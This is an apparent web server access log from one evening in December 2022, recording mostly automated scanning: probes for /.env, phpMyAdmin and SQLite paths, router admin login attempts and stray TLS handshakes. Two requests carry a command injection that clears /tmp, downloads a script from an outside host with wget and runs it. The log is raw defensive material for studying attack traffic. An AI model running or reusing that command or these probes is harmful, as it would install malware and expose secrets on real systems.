188.119.51.126 - - [29/Dec/2022:16:25:52 +0100] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
188.119.51.126 - - [29/Dec/2022:16:25:53 +0100] "POST / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.185.118.237 - - [29/Dec/2022:16:33:43 +0100] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://217.160.100.194:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
205.185.118.237 - - [29/Dec/2022:16:33:43 +0100] "" 400 0 "-" "-"
186.235.155.210 - - [29/Dec/2022:17:05:28 +0100] "GET /shell?cd+/tmp;rm+-rf+*;wget+heylitimysun.top/jaws;sh+/tmp/jaws HTTP/1.1" 301 166 "-" "Hello, world"
179.43.187.243 - - [29/Dec/2022:17:15:17 +0100] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://217.160.100.194:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
179.43.187.243 - - [29/Dec/2022:17:15:17 +0100] "" 400 0 "-" "-"
78.177.243.144 - - [29/Dec/2022:17:29:53 +0100] "GET /shell?cd+/tmp;rm+-rf+*;wget+heylitimysun.top/jaws;sh+/tmp/jaws HTTP/1.1" 301 166 "-" "Hello, world"
183.136.225.32 - - [29/Dec/2022:17:37:36 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
162.221.192.26 - - [29/Dec/2022:17:41:18 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
183.136.225.32 - - [29/Dec/2022:17:42:34 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [29/Dec/2022:17:42:59 +0100] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [29/Dec/2022:17:43:20 +0100] "GET /robots.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
34.140.248.32 - - [29/Dec/2022:17:59:11 +0100] "GET / HTTP/1.1" 301 166 "-" "python-requests/2.28.1"
209.141.35.50 - - [29/Dec/2022:18:06:56 +0100] "GET / HTTP/1.1" 301 166 "-" "Linux Gnu (cow)"
183.136.225.32 - - [29/Dec/2022:18:29:06 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.136.225.32 - - [29/Dec/2022:18:29:52 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [29/Dec/2022:18:30:13 +0100] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [29/Dec/2022:18:30:54 +0100] "GET /robots.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
172.104.31.18 - - [29/Dec/2022:18:34:24 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; de-de) AppleWebKit/534.15  (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4"
20.39.192.50 - - [29/Dec/2022:18:35:58 +0100] "GET /phpmyadmin/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Linux; Android 11; KB2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36"
190.103.180.70 - - [29/Dec/2022:19:26:12 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
159.65.250.7 - - [29/Dec/2022:20:33:14 +0100] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x7F\x83\xD1\xAF\xC7;\xB7?7\xEA_1<[\xC5\xE1\x81\xBA[\xC7#z4\xD4\xC7N\xA0Z\x8A\x01\x9F&\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
159.65.250.7 - - [29/Dec/2022:20:33:14 +0100] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xE6E\x19\x03\xEFZb\x90\xE9\xC2\xBA\x90.1fq\xF7\x12[\x19\xD8V\xB1\x0E{\xF7\xAC\xB23;~\xF1\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
159.65.250.7 - - [29/Dec/2022:20:33:14 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
20.39.192.50 - - [29/Dec/2022:20:42:38 +0100] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xFC\xD2%\xA0\xDA\x17\x8B\x9Aa\xC0\x1C\x00\x1A\xB7N\xC7\xF9((\xC1\x1E\xD2\xAC\x9E\xD1]\xD0\x9E\x0C\xA9b= \xDC\x02 \x8A\x84k\xCF\xA6S\xB1\x1E\x97\xF3D\xDF\xE9\xC7\xFE\x1Cgm\x01o\xE5\xC9RCS\xAF\xFA\x5C'\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
20.39.192.50 - - [29/Dec/2022:20:42:39 +0100] "GET /sqlite/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36"
87.236.176.29 - - [29/Dec/2022:20:59:16 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
183.136.225.32 - - [29/Dec/2022:21:31:26 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.136.225.32 - - [29/Dec/2022:21:37:51 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [29/Dec/2022:21:38:14 +0100] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [29/Dec/2022:21:38:35 +0100] "GET /robots.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
209.141.35.50 - - [29/Dec/2022:21:48:23 +0100] "GET / HTTP/1.1" 301 166 "-" "Linux Gnu (cow)"
